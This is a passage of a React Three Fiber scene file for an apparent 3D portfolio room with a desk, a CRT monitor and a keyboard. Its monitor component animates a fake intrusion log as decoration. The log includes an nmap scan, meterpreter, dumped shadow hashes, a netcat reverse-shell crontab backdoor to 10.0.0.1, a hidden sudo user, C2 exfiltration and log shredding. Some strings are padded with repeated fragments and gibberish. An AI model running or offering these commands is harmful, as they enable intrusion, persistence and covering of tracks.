import { useRef, useMemo } from 'react'
import { useFrame, useThree } from '@react-three/fiber'
import { RoundedBox, useGLTF, useTexture } from '@react-three/drei'
import * as THREE from 'three'
import gsap from 'gsap'


// ── Palette: warm clay + dark wood like reference image ───────────────────
const C = {
  island:    '#d8d5e8',
  islandTop: '#eae7f5',
  islandBot: '#b8b5cc',
  wall:      '#dddae8',
  wallDk:    '#c8c4d8',
  accent:    '#eceaf5',
  wood:      '#8b6f3a',
  woodDk:    '#6b4f2a',
  roof:      '#4a5878',   // blue-grey roof like reference
  roofDk:    '#363d55',
  screenBg:  '#0d1117',
  kaliBlue:  '#1a2a4a',   // Kali Linux wallpaper base
  kaliDragon:'#2244aa',
  termGrn:   '#39ff14',
  fire:      '#ff8800',
  fireYlw:   '#ffdd00',
  keyDk:     '#1a1a2a',
  keyMd:     '#2d2d3d',
  social:    '#c8c4d8',
  socDk:     '#a8a4c0',
}

// ── Camera fly hook ────────────────────────────────────────────────────────
export function useCameraFly() {
  const { camera } = useThree()
  const fly = (target, lookAt = [0, 0.5, 0], onComplete) => {
    gsap.to(camera.position, { x: target[0], y: target[1], z: target[2], duration: 1.4, ease: 'power3.inOut', onComplete })
    gsap.to({}, { duration: 1.4, ease: 'power3.inOut', onUpdate() { camera.lookAt(lookAt[0], lookAt[1], lookAt[2]) } })
  }
  return { fly, reset: () => fly([6, 4, 8], [0, 0.5, 0]) }
}

// ── Island base ────────────────────────────────────────────────────────────
function Island() {
  return (
    <group>
      <mesh position={[0, 0.13, 0]} receiveShadow>
        <cylinderGeometry args={[3.6, 3.6, 0.2, 56]} />
        <meshStandardMaterial color={C.islandTop} roughness={0.8} />
      </mesh>
      <mesh position={[0, -0.28, 0]} castShadow receiveShadow>
        <cylinderGeometry args={[3.6, 3.2, 0.9, 48]} />
        <meshStandardMaterial color={C.island} roughness={0.9} />
      </mesh>
      <mesh position={[0, -0.95, 0]}>
        <cylinderGeometry args={[3.2, 2.6, 0.7, 40]} />
        <meshStandardMaterial color={C.islandBot} roughness={0.9} />
      </mesh>
      <mesh position={[0, -1.5, 0]}>
        <cylinderGeometry args={[2.6, 1.5, 0.75, 32]} />
        <meshStandardMaterial color={C.islandBot} roughness={0.9} />
      </mesh>
      <mesh position={[0, -2.05, 0]}>
        <cylinderGeometry args={[1.5, 0.4, 0.7, 24]} />
        <meshStandardMaterial color="#a8a4c0" roughness={0.9} />
      </mesh>
    </group>
  )
}

// ── 2-wall open room (back + left only, open front + right) ───────────────
function House() {
  return (
    <group position={[0.1, 0.38, -0.5]}>

      {/* ── Floor ── */}
      <RoundedBox args={[2.6, 0.18, 2.6]} radius={0.06} smoothness={4} position={[0, 0.02, 0]} receiveShadow castShadow>
        <meshStandardMaterial color="#d8d4cc" roughness={0.75} />
      </RoundedBox>
      {[-0.82, -0.46, -0.1, 0.26, 0.62, 0.98, 1.34].map((z, i) => (
        <mesh key={i} position={[0, 0.102, z - 0.1]} receiveShadow>
          <boxGeometry args={[2.58, 0.012, 0.3]} />
          <meshStandardMaterial color={i % 2 === 0 ? '#d4d0c8' : '#ccc8c0'} roughness={0.7} />
        </mesh>
      ))}
      {[-0.82, -0.46, -0.1, 0.26, 0.62, 0.98].map((z, i) => (
        <mesh key={i} position={[0, 0.109, z + 0.15]}>
          <boxGeometry args={[2.58, 0.004, 0.008]} />
          <meshStandardMaterial color="#b8b4ac" roughness={0.85} />
        </mesh>
      ))}

      {/* ── Back wall — ROUNDED ── */}
      <RoundedBox args={[2.62, 2.0, 0.1]} radius={0.04} smoothness={4} position={[0, 1.0, -1.26]} castShadow>
        <meshStandardMaterial color={C.wall} roughness={0.65} />
      </RoundedBox>
      <mesh position={[0, 1.0, -1.21]}>
        <boxGeometry args={[2.6, 1.98, 0.01]} />
        <meshStandardMaterial color={C.accent} roughness={0.6} />
      </mesh>

      {/* ── Left wall — ROUNDED ── */}
      <RoundedBox args={[0.1, 2.0, 2.5]} radius={0.04} smoothness={4} position={[-1.25, 1.0, -0.01]} castShadow>
        <meshStandardMaterial color={C.wallDk} roughness={0.65} />
      </RoundedBox>

      {/* ── Corner column ── */}
      <RoundedBox args={[0.12, 2.0, 0.12]} radius={0.04} smoothness={4} position={[-1.25, 1.0, -1.26]} castShadow>
        <meshStandardMaterial color={C.wallDk} roughness={0.65} />
      </RoundedBox>

      {/* ── Window frame — ROUNDED ── */}
      <RoundedBox args={[0.07, 0.62, 0.68]} radius={0.025} smoothness={4} position={[-1.21, 1.08, -0.28]}>
        <meshStandardMaterial color={C.wallDk} roughness={0.55} />
      </RoundedBox>
      <mesh position={[-1.19, 1.08, -0.28]}>
        <boxGeometry args={[0.025, 0.54, 0.6]} />
        <meshStandardMaterial color="#c8ddf5" roughness={0.05} transparent opacity={0.7} />
      </mesh>
      <mesh position={[-1.185, 1.08, -0.28]}>
        <boxGeometry args={[0.02, 0.54, 0.018]} />
        <meshStandardMaterial color={C.wallDk} roughness={0.5} />
      </mesh>
      <mesh position={[-1.185, 1.08, -0.28]}>
        <boxGeometry args={[0.02, 0.018, 0.6]} />
        <meshStandardMaterial color={C.wallDk} roughness={0.5} />
      </mesh>
      {/* Window sill — ROUNDED */}
      <RoundedBox args={[0.06, 0.055, 0.76]} radius={0.02} smoothness={3} position={[-1.18, 0.75, -0.28]}>
        <meshStandardMaterial color={C.wallDk} roughness={0.6} />
      </RoundedBox>
      <RoundedBox args={[0.06, 0.04, 0.72]} radius={0.018} smoothness={3} position={[-1.18, 1.41, -0.28]}>
        <meshStandardMaterial color={C.wallDk} roughness={0.6} />
      </RoundedBox>

      {/* ── Shelf — ROUNDED ── */}
      <RoundedBox args={[0.96, 0.058, 0.12]} radius={0.02} smoothness={3} position={[0.7, 1.62, -1.15]}>
        <meshStandardMaterial color={C.wallDk} roughness={0.6} />
      </RoundedBox>


      {/* Radio — ROUNDED */}
      <RoundedBox args={[0.28, 0.16, 0.19]} radius={0.03} smoothness={4} position={[1.02, 1.73, -1.12]}>
        <meshStandardMaterial color={C.wall} roughness={0.5} />
      </RoundedBox>
      <mesh position={[1.02, 1.74, -1.03]}>
        <cylinderGeometry args={[0.048, 0.048, 0.02, 14]} />
        <meshStandardMaterial color={C.socDk} roughness={0.4} />
      </mesh>
      {[-0.04, 0, 0.04].map((dy, i) => (
        <mesh key={i} position={[0.88, 1.73 + dy, -1.03]}>
          <boxGeometry args={[0.07, 0.01, 0.02]} />
          <meshStandardMaterial color={C.wallDk} roughness={0.5} />
        </mesh>
      ))}
      <mesh position={[1.1, 1.9, -1.07]} rotation={[0, 0, 0.2]}>
        <cylinderGeometry args={[0.005, 0.005, 0.22, 5]} />
        <meshStandardMaterial color={C.socDk} roughness={0.5} />
      </mesh>

      {/* Books — ROUNDED */}
      <group position={[0.44, 1.649, -1.15]}>
        {[0, 0.03, 0.06].map((dy, i) => (
          <RoundedBox key={i} args={[0.22, 0.028, 0.16]} radius={0.008} smoothness={3} position={[0, dy, 0]}>
            <meshStandardMaterial color={[C.socDk, C.wallDk, C.wall][i]} roughness={0.7} />
          </RoundedBox>
        ))}
        {[0.28, 0.34, 0.41].map((x, i) => (
          <RoundedBox key={i} args={[0.055, 0.2, 0.15]} radius={0.01} smoothness={3} position={[x, 0.1, 0]}>
            <meshStandardMaterial color={[C.wall, C.socDk, C.wallDk][i]} roughness={0.6} />
          </RoundedBox>
        ))}
      </group>

      {/* Skirting */}
      <mesh position={[0, 0.1, -1.21]}>
        <boxGeometry args={[2.58, 0.14, 0.04]} />
        <meshStandardMaterial color={C.wallDk} roughness={0.7} />
      </mesh>
      <mesh position={[-1.2, 0.1, 0.01]}>
        <boxGeometry args={[0.04, 0.14, 2.5]} /> 
        <meshStandardMaterial color={C.wallDk} roughness={0.7} />
      </mesh>

      <pointLight position={[0.2, 1.8, -0.2]} intensity={2.2} color="#ffe8c0" distance={4.0} decay={2} />
      <pointLight position={[1.0, 1.2, 0.6]} intensity={0.6} color="#d0d8f0" distance={3.0} decay={2} />
    </group>
  )
}


// ── Keyboard with individual keycaps ──────────────────────────────────────
function Keyboard({ position }) {
  const keys = useMemo(() => {
    const arr = []
    const rows = [14, 13, 12, 11, 10]
    const offsets = [0, 0.02, 0.038, 0.055, 0.018]
    for (let r = 0; r < rows.length; r++) {
      for (let c = 0; c < rows[r]; c++) {
        arr.push({
          x: (c - rows[r] / 2 + 0.5) * 0.043 + offsets[r],
          z: (r - 2) * 0.044,
        })
      }
    }
    return arr
  }, [])
  return (
    <group position={position}>
      {/* Base plate — cream/beige like old keyboards */}
      <mesh castShadow>
        <boxGeometry args={[0.72, 0.022, 0.28]} />
        <meshStandardMaterial color="#d8d4c8" roughness={0.5} />
      </mesh>
      {/* Raised key bed */}
      <mesh position={[0, 0.014, -0.02]}>
        <boxGeometry args={[0.68, 0.01, 0.24]} />
        <meshStandardMaterial color="#ccc8bc" roughness={0.5} />
      </mesh>
      {keys.map((k, i) => (
        <mesh key={i} position={[k.x, 0.022, k.z - 0.02]}>
          <boxGeometry args={[0.036, 0.016, 0.038]} />
          <meshStandardMaterial color="#c8c4b8" roughness={0.4} />
        </mesh>
      ))}
      {/* Space bar */}
      <mesh position={[0.02, 0.022, 0.1]}>
        <boxGeometry args={[0.22, 0.016, 0.038]} />
        <meshStandardMaterial color="#c8c4b8" roughness={0.4} />
      </mesh>
    </group>
  )
}

// ── Mouse ─────────────────────────────────────────────────────────────────
function MouseWithCable({ position }) {
  // Coiled cable points
  const cablePoints = useMemo(() => {
    const pts = []
    for (let i = 0; i <= 24; i++) {
      const t = i / 24
      const angle = t * Math.PI * 4
      const radius = 0.012 + t * 0.008
      pts.push(new THREE.Vector3(
        position[0] + Math.cos(angle) * radius - 0.18 + t * 0.22,
        position[1] + 0.01 + Math.sin(angle * 2) * 0.005,
        position[2] + Math.sin(angle) * radius
      ))
    }
    return pts
  }, [position])
 
  const cableCurve = useMemo(() => new THREE.CatmullRomCurve3(cablePoints), [cablePoints])
  const cableGeom = useMemo(() => new THREE.TubeGeometry(cableCurve, 32, 0.004, 5, false), [cableCurve])
 
  return (
    <group>
      {/* Mouse body — rounded oblong box style */}
      <mesh position={position} castShadow>
        <capsuleGeometry args={[0.03, 0.065, 6, 12]} />
        <meshStandardMaterial color="#d0ccbe" roughness={0.4} />
      </mesh>
      {/* Left/right button split line */}
      <mesh position={[position[0], position[1] + 0.032, position[2] - 0.01]}>
        <boxGeometry args={[0.002, 0.003, 0.05]} />
        <meshStandardMaterial color="#b8b4a8" roughness={0.5} />
      </mesh>
      {/* Scroll wheel */}
      <mesh position={[position[0], position[1] + 0.033, position[2] - 0.012]} rotation={[Math.PI/2, 0, 0]}>
        <cylinderGeometry args={[0.008, 0.008, 0.014, 8]} />
        <meshStandardMaterial color="#888880" roughness={0.4} />
      </mesh>
      {/* Coiled cable */}
      <mesh geometry={cableGeom}>
        <meshStandardMaterial color="#b0aca0" roughness={0.6} />
      </mesh>
    </group>
  )
}

// ── CRT Monitor helper ────────────────────────────────────────────────────
// Big chunky old-school box monitor like in the reference image
function CRTMonitor({ position, rotation = [0,0,0], screenColor, screenContent, width = 0.82, height = 0.62, depth = 0.52 }) {
  return (
    <group position={position} rotation={rotation}>
      {/* Main CRT body — deep box */}
      <mesh castShadow>
        <boxGeometry args={[width, height, depth]} />
        <meshStandardMaterial color="#d4d0c4" roughness={0.65} />
      </mesh>
      {/* Front face slightly lighter */}
      <mesh position={[0, 0, depth/2 - 0.001]}>
        <boxGeometry args={[width, height, 0.01]} />
        <meshStandardMaterial color="#dedad0" roughness={0.6} />
      </mesh>
      {/* Screen bezel — inset */}
      <mesh position={[0, 0.04, depth/2 + 0.005]}>
        <boxGeometry args={[width * 0.82, height * 0.72, 0.018]} />
        <meshStandardMaterial color="#c8c4b8" roughness={0.5} />
      </mesh>
      {/* Screen glass — slightly convex look */}
      <mesh position={[0, 0.04, depth/2 + 0.016]}>
        <boxGeometry args={[width * 0.76, height * 0.66, 0.008]} />
        <meshStandardMaterial color={screenColor} emissive={screenColor} emissiveIntensity={0.15} roughness={0.05} transparent opacity={0.92} />
      </mesh>
      {/* Screen content */}
      {screenContent}
      {/* Bottom chin — buttons area */}
      <mesh position={[0, -height*0.38, depth/2 + 0.006]}>
        <boxGeometry args={[width * 0.5, height * 0.1, 0.01]} />
        <meshStandardMaterial color="#c0bcb0" roughness={0.6} />
      </mesh>
      {/* Power button */}
      <mesh position={[width*0.28, -height*0.38, depth/2 + 0.012]}>
        <cylinderGeometry args={[0.018, 0.018, 0.012, 10]} />
        <meshStandardMaterial color="#a8a49a" roughness={0.4} />
      </mesh>
      {/* Small indicator LED */}
      <mesh position={[width*0.28, -height*0.38 + 0.04, depth/2 + 0.012]}>
        <sphereGeometry args={[0.006, 6, 6]} />
        <meshStandardMaterial color="#00ff44" emissive="#00ff44" emissiveIntensity={2} roughness={0.1} />
      </mesh>
      {/* Side vent lines */}
      {[0, 0.04, 0.08].map((dy, i) => (
        <mesh key={i} position={[width/2 + 0.002, 0.1 - dy, 0]} rotation={[0, Math.PI/2, 0]}>
          <boxGeometry args={[depth * 0.5, 0.008, 0.004]} />
          <meshStandardMaterial color="#c0bcb0" roughness={0.7} />
        </mesh>
      ))}
      {/* CRT neck/stand */}
      <mesh position={[0, -height/2 - 0.04, 0]}>
        <boxGeometry args={[width * 0.55, 0.06, depth * 0.55]} />
        <meshStandardMaterial color="#c8c4b8" roughness={0.6} />
      </mesh>
      <mesh position={[0, -height/2 - 0.08, 0]}>
        <boxGeometry args={[width * 0.45, 0.04, depth * 0.45]} />
        <meshStandardMaterial color="#c0bcb0" roughness={0.6} />
      </mesh>
    </group>
  )
} 


// image wallpaper

// function KaliWallpaper() {
//   const texture = useTexture('/vecteezy_old-green-tv-screen-showing-text-live-broadcast-appearing-in_72747679.mp4')
//   return (
//     <group>
//       {/* Wallpaper plane — sits just in front of screen glass */}
//       <mesh position={[0, 0.04, 0.272]}>
//         <planeGeometry args={[0.84 * 0.74, 0.64 * 0.64]} />
//         <meshStandardMaterial
//           map={texture}
//           roughness={0.05}
//           toneMapped={false}
//           emissiveMap={texture}
//           emissive="#ffffff"
//           emissiveIntensity={0.4}
//         />
//       </mesh>
//       <pointLight position={[0, 0.04, 0.36]} intensity={0.6} color="#1a88cc" distance={1.6} decay={2} />
//     </group>
//   )
// }


// video wallpaper

// function KaliWallpaper() {
//   const videoTexture = useMemo(() => {
//     const video = document.createElement('video')
//     video.src = '/stock-footage-computer-programming-code-green-text-background-scrolling-programming-security-hacking-code-data.mp4'
//     video.loop = true
//     video.muted = true
//     video.autoplay = true
//     video.playsInline = true
//     video.play()
//     const texture = new THREE.VideoTexture(video)
//     texture.minFilter = THREE.LinearFilter
//     texture.magFilter = THREE.LinearFilter
//     texture.format = THREE.RGBAFormat
//     return texture
//   }, [])

//   return (
//     <group>
//       <mesh position={[0, 0.04, 0.272]}>
//         <planeGeometry args={[0.84 * 0.74, 0.64 * 0.64]} />
//         <meshStandardMaterial
//           map={videoTexture}
//           emissiveMap={videoTexture}
//           emissive="#ffffff"
//           emissiveIntensity={0.5}
//           toneMapped={false}
//           roughness={0.05}
//         />
//       </mesh>
//       <pointLight position={[0, 0.04, 0.36]} intensity={0.6} color="#1a88cc" distance={1.6} decay={2} />
//     </group>
//   )
// }


// live typing wallpaper 
 
function KaliWallpaper() {
  const canvasTexture = useMemo(() => {
    const canvas = document.createElement('canvas')
    canvas.width = 800
    canvas.height = 500
    const ctx = canvas.getContext('2d')

    const lines = []
    const maxLines = 28
    const logMessages = [
      '> INITIALIZING EXPLOIT FRAMEWORK v4.2.1',
      '> TARGET: 192.168.1.1 | PORT SCAN RUNNING...',
      '[ ** ] nmap -sV -sC -p- 192.168.1.1 --open',
      '[ OK ] 22/tcp  open  ssh     OpenSSH 8.2 [ OK ] 22/tcp  open  ssh OpenSSH 8.2 [ OK ] 22/tcp  open  ssh OpenSSH 8.2',
      '[ OK ] 80/tcp  open  http    Apache/2.4.41 [ OK ] 22/tcp  open  ssh     OpenSSH 8.2',
      '[ OK ] 443/tcp open  https   nginx 1.18.0',
      '[ !! ] 3306/tcp open mysql   MySQL 5.7.32 [ OK ] 22/tcp  open  ssh',
      '[ !! ] 6379/tcp open redis   Redis 6.0.9[ OK ] 22/tcp  open  ssh     OpenSSH 8.2[ OK ] 22/tcp  open  ',
      '[ OK ] 8080/tcp open  http   Tomcat/9.0.45[ OK ] 22/tcp  open  ssh     OpenSSH 8.2',
      '──────────────────────────────────────────────',
      '> LOADING MODULE: exploit/multi/handler',
      '[ ** ] Checking for CVE-2021-44228 (Log4Shell)',
      '[ OK ] TARGET IS VULNERABLE — PROCEEDING',
      '[ ** ] Generating payload: linux/x64/meterpreter',
      '[ OK ] PAYLOAD SIZE: 207 bytes',
      '[ ** ] Sending exploit to 192.168.1.1:8080...',
      '[ OK ] SESSION 1 OPENED (192.168.1.1:4444)',
      '──────────────────────────────────────────────',
      'meterpreter > getuid',
      'Server username: www-data',
      'meterpreter > sysinfo',
      'Computer : ubuntu-server-prod',
      'OS       : Linux 5.4.0-74-generic',
      'Arch     : x64 | Meterpreter : x64/linux',
      '[ !! ] 6379/tcp open redis Redis 6.0.9[ OK ] 22/tcp open ssh OpenSSH 8.2[ OK ] 22/tcp  open  ',
      '[ OK ] 8080/tcp open  http Tomcat/9.0.45[ OK ] 22/tcp open ssh OpenSSH 8.2',
      'meterpreter > getuid',
      'Server username: root',
      '──────────────────────────────────────────────',
      '> DUMPING /etc/shadow...',
      'root:$6$xyz$AbCdEfGhIjKlMnOpQrStUvWxYz1234:19000:0:99999:7:::',
      'ubuntu:$6$abc$ZyXwVuTsRqPoNmLkJiHgFeDcBa9876:19000:0:99999:7:::',
      'mysql:$6$def$MnOpQrStUvWxYzAbCdEfGh5678:19000:0:99999:7:::',
      '[ OK ] HASHES SAVED → /tmp/.loot/shadow.txt',
      '──────────────────────────────────────────────',
      '> RUNNING HASHCAT ON CAPTURED HASHES...',
      '[ ** ] hashcat -m 1800 shadow.txt rockyou.txt',
      '[ OK ] root     : toor1234!',
      '[ OK ] ubuntu   : ubuntu@123',
      '[ OK ] mysql    : mysql_p@sssdfsdfsdfsdfdsferwteemr nter t erg er ge',
      '──────────────────────────────────────────────',
      '> ESTABLISHING PERSISTENCE...',
      '[ ** ] Writing crontab backdoor...',
      '[ OK ] @reboot nc -e /bin/bash 10.0.0.1 9999',
      '[ ** ] Adding SSH authorized_key...',
      '[ OK ] KEY INJECTED → /root/.ssh/authorized_keysegregerg neg niuehrg8io ien    oiu ho ednvi ijncvxo uinwsojno iusdho',
      '[ ** ] Creating hidden user: _sysupdate',
      '[ OK ] USER CREATED | SUDO RIGHTS GRANTED',
      '──────────────────────────────────────────────',
      'root:$6$xyz$AbCdEfGhIjKlMnOpQrStUvWxYz1234:19000:0:99999:7:::',
      'ubuntu:$6$abc$ZyXwVuTsRqPoNmLkJiHgFeDcBa9876:19000:0:99999:7:::',
      'mysql:$6$def$MnOpQrStUvWxYzAbCdEfGh5678:19000:0:99999:7:::',
      '[ OK ] HASHES SAVED → /tmp/.loot/shadow.txt',
      '[ OK ] 192.168.1.20 — fileserver01',
      '[ OK ] 192.168.1.45 — workstation-CEO  OK ] 192.168.1.45 — workstation-CEO',
      '[ OK ] 192.168.1.67 — workstation-CFO',
      '[ ** ] Pivoting through 192.168.1.1...',
      '[ OK ] 192.168.1.10 — COMPROMISED',
      '[ OK ] 192.168.1.45 — COMPROMISED OK ] 192.168.1.45 — workstation-CEO',
      '──────────────────────────────────────────────',
      '> EXFILTRATING SENSITIVE DATA...',
      '[ ** ] find / -name "*.pdf" -size +100k 2>/dev/null',
      '[ OK ] /home/ceo/Documents/Q4_Revenue.pdf',
      '[ OK ] /home/cfo/Finance/budget_2024.xlsx',
      '[ OK ]  /var/www/html/config/database.php/var/www/html/config/database.php/var/www/html/config/database.php',
      '[ OK ] /etc/nginx/ssl/server.key',
      '[ ** ] Uploading to C2: 10.0.0.1:443...',
      '[ OK ] 847MB EXFILTRATED SUCCESSFULLY',
      '──────────────────────────────────────────────',
      '> COVERING TRACKS...',
      '[ ** ] shred -vfz /var/log/auth.log[ *REINITIALIZING SCAN ON NEW SUBNET.ll',
      '[ ** ] shred -vfz /var/log/syslog',
      '[ ** ] history -c && unset HISTFILE[ ** REINITIALIZING SCAN ON NEW SUBNET.size +100k 2>/dev/null[ ** ] find / -name "*.pdf" -size +100k 2>/dev/null',
      '[ OK ] ALL LOGS CLEARED',
      '[ ** ] Removing temp files...[ ** ] find / -name "*.pdf" ',
      '[ OK ] /tmp/.loot DELETED',
      '──────────────────────────────────────────────',
      '>>> OPERATION COMPLETE — GHOST MODE ACTIVE <<<',
      '──────────────────────────────────────────────',
      '> REINITIALIZING SCAN ON NEW SUBNET...',
      '[ ** ] nmap -sn 10.10.10.0/24',
      '[ OK ] 23 hosts up | 977 hosts down',
    ]

    let lineIndex = 0
    let charIndex = 0
    let currentLine = ''
    let lastTime = 0
    let charDelay = 18

    function getLineColor(line) {
      if (line.includes('[ OK ]')) return '#00ff41'
      if (line.includes('[ ** ]')) return '#ffdd00'
      if (line.includes('[ !! ]')) return '#ff6600'
      if (line.includes('>>>')) return '#ff4444'
      if (line.includes('──')) return '#1a4a1a'
      if (line.startsWith('>')) return '#00ccff'
      if (line.startsWith('meterpreter')) return '#ff88ff'
      if (line.startsWith('root:') || line.startsWith('ubuntu:') || line.startsWith('mysql:')) return '#ff8844'
      if (line.includes('COMPROMISED') || line.includes('COMPLETE') || line.includes('GRANTED')) return '#ff4444'
      return '#00cc33'
    }

    function drawFrame(timestamp) {
      ctx.fillStyle = '#050d05'
      ctx.fillRect(0, 0, 800, 500)

      // CRT scanlines
      for (let y = 0; y < 500; y += 3) {
        ctx.fillStyle = 'rgba(0,0,0,0.22)'
        ctx.fillRect(0, y, 800, 1)
      }

      // Typing logic — variable speed for drama
      const msg = logMessages[lineIndex % logMessages.length]
      charDelay = 0

      // Type multiple characters per frame
      for (let tick = 0; tick < 8; tick++) {
        const m = logMessages[lineIndex % logMessages.length]
        if (charIndex < m.length) {
          currentLine += m[charIndex]
          charIndex++
        } else {
          lines.push({ text: currentLine, color: getLineColor(currentLine) })
          if (lines.length > maxLines) lines.shift()
          currentLine = ''
          charIndex = 0
          lineIndex++
        }
      }

      // Draw completed lines
      const lineH = 17
      const startY = 16
      ctx.font = 'bold 12px "Courier New", monospace'

      lines.forEach((line, i) => {
        const alpha = 0.35 + (i / lines.length) * 0.65
        ctx.globalAlpha = alpha
        ctx.fillStyle = line.color
        ctx.fillText(line.text, 8, startY + i * lineH)
      })

      // Current typing line
      if (currentLine !== '') {
        const col = getLineColor(currentLine)
        ctx.globalAlpha = 1.0
        ctx.fillStyle = col
        ctx.font = 'bold 12px "Courier New", monospace'
        const ty = startY + lines.length * lineH
        ctx.fillText(currentLine, 8, ty)

        // Blinking block cursor
        if (Math.floor(timestamp / 450) % 2 === 0) {
          const cx = 8 + ctx.measureText(currentLine).width + 2
          ctx.fillStyle = '#00ff41'
          ctx.fillRect(cx, ty - 12, 8, 14)
        }
      }

      ctx.globalAlpha = 1.0

      // Subtle green center glow
      const grd = ctx.createRadialGradient(400, 250, 60, 400, 250, 320)
      grd.addColorStop(0, 'rgba(0,255,65,0.045)')
      grd.addColorStop(1, 'rgba(0,0,0,0)')
      ctx.fillStyle = grd
      ctx.fillRect(0, 0, 800, 500)

      texture.needsUpdate = true
      requestAnimationFrame(drawFrame)
    }

    const texture = new THREE.CanvasTexture(canvas)
    requestAnimationFrame(drawFrame)
    return texture
  }, [])

  return (
    <group>
      <mesh position={[0, 0.04, 0.272]}>
        <planeGeometry args={[0.84 * 0.74, 0.64 * 0.64]} />
        <meshStandardMaterial
          map={canvasTexture}
          emissiveMap={canvasTexture}
          emissive="#001100"
          emissiveIntensity={0.7}
          toneMapped={false}
          roughness={0.05}
        />
      </mesh>
      <pointLight position={[0, 0.04, 0.36]} intensity={1.0} color="#00ff41" distance={2.2} decay={2} />
    </group>
  )
}



// ── Desk Setup (retro reference style) ────────────────────────────────────
function DeskSetup({ onSelect }) {
  return (
    <group position={[0.1, 0.38, -1.480]} onClick={(e) => { e.stopPropagation(); onSelect('projects') }}>

      {/* ── Desk top — ROUNDED ── */}
      <RoundedBox args={[2.0, 0.07, 0.95]} radius={0.025} smoothness={4} position={[0, 0.7, 0.245]} castShadow>
        <meshStandardMaterial color="#dedad4" roughness={0.55} />
      </RoundedBox>

      {/* ── Right drawer tower — ROUNDED ── */}
      <RoundedBox args={[0.38, 0.68, 0.88]} radius={0.025} smoothness={4} position={[0.8, 0.34, 0.245]} castShadow>
        <meshStandardMaterial color="#d8d4ce" roughness={0.6} />
      </RoundedBox>
      {[0.54, 0.34, 0.14].map((y, i) => (
        <group key={i}>
          <RoundedBox args={[0.34, 0.16, 0.04]} radius={0.018} smoothness={3} position={[0.8, y, 0.705]}>
            <meshStandardMaterial color="#e0dcd6" roughness={0.5} />
          </RoundedBox>
          <RoundedBox args={[0.1, 0.026, 0.018]} radius={0.008} smoothness={3} position={[0.8, y, 0.730]}>
            <meshStandardMaterial color="#b0aca6" roughness={0.35} metalness={0.2} />
          </RoundedBox>
        </group>
      ))}

      {/* ── Left leg panel — ROUNDED ── */}
      <RoundedBox args={[0.06, 0.68, 0.86]} radius={0.02} smoothness={3} position={[-0.88, 0.34, 0.245]} castShadow>
        <meshStandardMaterial color="#d0ccc6" roughness={0.65} />
      </RoundedBox>

      {/* ── CRT Monitor — ROUNDED body ── */}
      <group position={[0.08, 1.08, 0.04]}>
        <RoundedBox args={[0.84, 0.64, 0.5]} radius={0.04} smoothness={5} castShadow>
          <meshStandardMaterial color="#d4d0c4" roughness={0.65} />
        </RoundedBox>
        {/* Screen bezel */}
        <RoundedBox args={[0.84*0.82, 0.64*0.72, 0.018]} radius={0.025} smoothness={4} position={[0, 0.04, 0.255]}>
          <meshStandardMaterial color="#c8c4b8" roughness={0.5} />
        </RoundedBox>
        {/* Screen */}
        <mesh position={[0, 0.04, 0.266]}>
          <boxGeometry args={[0.84*0.76, 0.64*0.66, 0.008]} />
          <meshStandardMaterial color="#0d1117" roughness={0.05} />
        </mesh>
        {/* Screen content */}
        {/* Real Kali wallpaper texture */}
        <KaliWallpaper />

        {/* Stand */}
        <RoundedBox args={[0.84*0.55, 0.06, 0.5*0.55]} radius={0.02} smoothness={3} position={[0, -0.64/2-0.04, 0]}>
          <meshStandardMaterial color="#c8c4b8" roughness={0.6} />
        </RoundedBox>
        {/* Power LED */}
        <mesh position={[0.84*0.28, -0.64*0.38, 0.262]}>
          <sphereGeometry args={[0.006, 6, 6]} />
          <meshStandardMaterial color="#00ff44" emissive="#00ff44" emissiveIntensity={2} roughness={0.1} />
        </mesh>
      </group>

      <Keyboard position={[0.05, 0.737, 0.490]} />
      <MouseWithCable position={[0.6, 0.738, 0.53]} />

      {/* ── Desk lamp ── */}
      <group position={[0.82, 0.73, 0.022]}>
        <mesh castShadow><cylinderGeometry args={[0.07, 0.08, 0.035, 12]} /><meshStandardMaterial color="#d0ccbe" roughness={0.5} /></mesh>
        <mesh position={[0, 0.28, 0]}><cylinderGeometry args={[0.014, 0.016, 0.52, 8]} /><meshStandardMaterial color="#c8c4b8" roughness={0.45} /></mesh>
        <mesh position={[-0.04, 0.56, -0.06]} rotation={[0.5, 0, -0.1]}><cylinderGeometry args={[0.012, 0.014, 0.32, 8]} /><meshStandardMaterial color="#c8c4b8" roughness={0.45} /></mesh>
        <mesh position={[-0.1, 0.72, -0.18]} rotation={[1.0, 0, 0.1]}>
          <sphereGeometry args={[0.1, 10, 8, 0, Math.PI*2, 0, Math.PI*0.55]} />
          <meshStandardMaterial color="#dedad2" roughness={0.4} side={THREE.DoubleSide} />
        </mesh>
        <mesh position={[-0.09, 0.68, -0.18]}><sphereGeometry args={[0.028, 8, 8]} /><meshStandardMaterial color="#ffe8c0" emissive="#ffe8c0" emissiveIntensity={2.5} roughness={0.1} /></mesh>
        <pointLight position={[-0.09, 0.62, -0.2]} intensity={2.4} color="#ffe8c0" distance={2.8} decay={2} />
      </group>

      {/* ── Coffee mug ── */}
      <group position={[0.660, 0.738, 0.30]}>
        <mesh castShadow><cylinderGeometry args={[0.046, 0.040, 0.085, 14]} /><meshStandardMaterial color="#d8d4ce" roughness={0.5} /></mesh>
        <mesh position={[0, 0.038, 0]}><cylinderGeometry args={[0.042, 0.042, 0.003, 14]} /><meshStandardMaterial color="#3a1a08" roughness={0.3} /></mesh>
        <mesh position={[0.058, 0.01, 0]} rotation={[0, 0, Math.PI/2]}><torusGeometry args={[0.024, 0.007, 6, 12, Math.PI]} /><meshStandardMaterial color="#d0ccc6" roughness={0.5} /></mesh>
      </group>



      {/* ── Books stack ── */}
      {/* <group position={[0.8, 0.738, 0.065]}> */}
      <group position={[0.8, 0.738, 0.165]}>
        {[{h:0.028,w:0.18,d:0.14,col:'#c8c4b8',dy:0},{h:0.025,w:0.17,d:0.13,col:'#b8b4a8',dy:0.028},{h:0.022,w:0.16,d:0.12,col:'#c4c0b4',dy:0.053}].map((b,i) => (
          <RoundedBox key={i} args={[b.w, b.h, b.d]} radius={0.006} smoothness={3} position={[0, b.dy+b.h/2, 0]}>
            <meshStandardMaterial color={b.col} roughness={0.7} />
          </RoundedBox>
        ))}
      </group>

      {/* ── Notepad ── */}
      <group position={[0.84, 0.738, 0.38]}>
        <RoundedBox args={[0.14, 0.008, 0.12]} radius={0.004} smoothness={3}>
          <meshStandardMaterial color="#f5f0e0" roughness={0.7} />
        </RoundedBox>
        {[0.03, 0.01, -0.01, -0.03].map((dz, i) => (
